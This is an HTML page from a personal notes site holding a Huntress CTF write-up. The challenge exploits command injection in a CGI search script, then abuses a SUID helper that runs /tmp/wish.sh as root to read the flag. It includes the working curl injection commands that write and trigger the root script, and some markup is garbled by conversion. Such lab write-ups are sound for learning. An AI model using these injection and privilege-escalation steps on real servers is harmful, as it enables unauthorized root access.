@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2025-10-15 · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="huntress/2025/2025-10-15.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/huntress/index.html">Huntress CTF</a> &rsaquo; <a href="/huntress/2025/index.html">2025</a></div>
+  <h1 id="2025-10-15">2025-10-15</h1>
+<h1 id="phasing-through-printers"><strong>📦 Phasing Through Printers</strong></h1>
+<p><span class="img-missing">image unavailable</span></p>
+<p>```plain text<br />
+Vulnerability:<br />
+Command injection in CGI script (search.c)<br />
+User input concatenated directly into popen() command</p>
+<pre><code>
+```plain text
+The search.c program takes user input from the query string, URL-decodes it, and directly concatenates it into a shell command without any sanitization:
+
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<p>```plain text<br />
+Initial Access:</p>
+<p>Inject commands via URL parameter q<br />
+Running as www-data user</p>
+<pre><code>&lt;span class=&quot;img-missing&quot;&gt;image unavailable&lt;/span&gt;
+
+```plain text
+Privilege Escalation:
+
+Found SUID binary: /usr/local/bin/admin_help
+Binary executes /tmp/wish.sh as root
+Filters for &quot;bad strings&quot; in script
+
+-rwsr-xr-x 1 root root 16416 Sep 29 13:09 admin_help
+
+There's a custom SUID binary called admin_help in /usr/local/bin/ that runs as root, this is our privilege escalation vector.
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<p>```plain text<br />
+Exploit:</p>
+<p>Create /tmp/wish.sh with payload<br />
+Run admin_help to execute as root<br />
+Read /root/flag.txt</p>
+<pre><code>&lt;span class=&quot;img-missing&quot;&gt;image unavailable&lt;/span&gt;
+
+&lt;span class=&quot;img-missing&quot;&gt;image unavailable&lt;/span&gt;
+&lt;span class=&quot;img-missing&quot;&gt;image unavailable&lt;/span&gt;
+&lt;span class=&quot;img-missing&quot;&gt;image unavailable&lt;/span&gt;
+```plain text
+Looking at the strings output:
+
+It reads from /tmp/wish.sh
+It checks for &quot;Bad String in File&quot; (some filtering)
+If the check passes, it runs: chmod +x /tmp/wish.sh &amp;&amp; /tmp/wish.sh as root (because it's SUID)
+
+The exploit:
+
+Create /tmp/wish.sh with commands we want to run as root
+Make sure it doesn't contain whatever &quot;bad string&quot; it's filtering
+Run admin_help which will execute our script as root!
+</code></pre>
+<p>```plain text<br />
+┌──(kali㉿kali)-[/mnt/tmp/CTF/2025-Huntress-CTF/15]<br />
+└─$ curl "http://10.1.78.17/cgi-bin/search.cgi?q=test;echo+'cat+/root/flag.txt'+&gt;+/tmp/wish.sh"</p>
+<p>┌──(kali㉿kali)-[/mnt/tmp/CTF/2025-Huntress-CTF/15]<br />
+└─$ curl "http://10.1.78.17/cgi-bin/search.cgi?q=test;/usr/local/bin/admin_help"<br />
+flag{93541544b91b7d2b9d61e90becbca309}cat /root/flag.txt /var/www/html/data/printer_drivers.txt<br />
+<br>Your wish is my command... maybe :)<br />
+<br><br />
+```</p>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
